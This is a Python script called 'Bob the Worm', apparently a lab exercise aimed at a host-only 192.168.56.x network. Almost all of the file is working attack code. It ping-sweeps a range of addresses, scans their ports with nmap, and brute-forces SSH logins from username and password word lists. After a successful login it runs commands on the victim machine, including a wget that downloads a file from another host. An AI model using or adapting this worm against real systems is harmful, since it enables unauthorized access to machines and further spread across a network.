#############################
# Filename: hello.py        #
# Bob the Worm              #
# Date created: 10/26/2021  #
#############################

import os
import nmap
import paramiko
import time
import netifaces


IpList = []
SSHlist = []
usernames = []
passwords = []





def nmaper():
    #----------------------#
    # This function scans open common ports of all active machines
    # listed in IpList[]. If port 22 is open on the active machine,
    # it will be added to a list called SSHlist[]
    # *List of ports can be modified to your liking.
    #----------------------#

    print("\n----Scanning active machines for open ports----\n")
    portscan = nmap.PortScanner()
    scannedports = [20,21,22,23,25,53,67,68,69,80,110,443,1337,3389,13337]
    for target in IpList:
        print(f'Scanning: {target} for open ports:')
        #no output means no open ports
        for portnum in (scannedports):
            results = portscan.scan(target, str(portnum))
            results = results['scan'][target]['tcp'][portnum]['state']
            if (results == "open"):
                print(f'Port {portnum} is {results}.')
                if (portnum == 22):
                    SSHlist.append(target)
        print("-----------------------------------\n")
        

        
def open_file():
    #----------------------#
    # This function opens the username and password files to be used in 
    # bruteforcing the SSH of open machines and creates 2 iterable lists.
    # usernames[] stores all usernames in the usernames.txt file
    # passwords[] stores all passwords in the passwords.txt file
    #----------------------#
    
    with open('usernames.txt') as usernamefile:
            for line in usernamefile:
                usernames.append(line.rstrip())
    with open('passwords.txt') as passwordfile:
            for line in passwordfile:
                passwords.append(line.rstrip())



def bruteforce():
    #----------------------#
    # This function takes SSHlist[] and iterates through each IP and tries every name
    # in the username file and tests them again every password. If the connection is
    # active, the function ssher is called to further exploit the IP. 
    #----------------------#

    open_file()
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for target in (SSHlist):
        print(f'\nBruteforcing SSH on {target} port 22\n')
        for user in usernames:
            print(f'\nTesting username: {user}')
            for passwd in passwords:
                print(f'Testing password: {passwd}')
                try:
                    client.connect(target, username=user, password=passwd)
                    if client.get_transport() is not None:
                        if client.get_transport().is_active():
                            print(f'\n((( Username: {user} and Password: {passwd} were successful! )))')
                            time.sleep(5)
                            ssher(client)
                except paramiko.ssh_exception.AuthenticationException:
                    print("Username or Password is incorrect.")
                except paramiko.ssh_exception.SSHException:
                    print('SSH server is not responding.')




def ssher(client):
    #----------------------#
    # This function will take an active session as a parameter,
    # perform different pre-determined commands and
    # print the output of commands (if applicable)
    #
    # *Note: output of these commands (variable: lines) are lists.
    #----------------------#
    
    print("\nSuccessfully connected!")
    command = 'whoami'
    command2 = "wget http://192.168.56.101/yOu_HaVe_BeEn_HaCkEd"
    command3 = "cat yOu_HaVe_BeEn_HaCkEd"

    print(f'\n$ {command}')
    (stdin, stdout, stderr) = client.exec_command(command)
    lines = stdout.readlines()
    print(lines[0])
    print(f'\n$ {command2}')
    (stdin, stdout, stderr) = client.exec_command(command2)
    print(f'\n$ {command3}')
    (stdin, stdout, stderr) = client.exec_command(command3)
    lines = stdout.readlines()
    print(lines)

    client.close()





def ping():
    #----------------------#
    # This function checks a range of of which the gateway can be customized
    # to scan any specific range of IP's. If an IP is returned to be active, 
    # the IP is then placed in IpList[].
    # 
    # Futher implementation of netifaces can be used here to automate finding
    # the local IP gateway and scanning of that local IP range for active machines.
    #----------------------#


    #gw = netifaces.gateways()
    #gatewy = gw['Host-Only'][netifaces.AF_INET][0]
    #print(gatewy)
    
    print("\n----Scanning for active machines----")
    ipbase = "192.168.56."
    for x in range (100,110):
        ip = ipbase + str(x)
        if not os.system('ping -n 1 '+ip+' >'+ip):
            print(ip)
            IpList.append(ip)

    os.system('del '+ip)    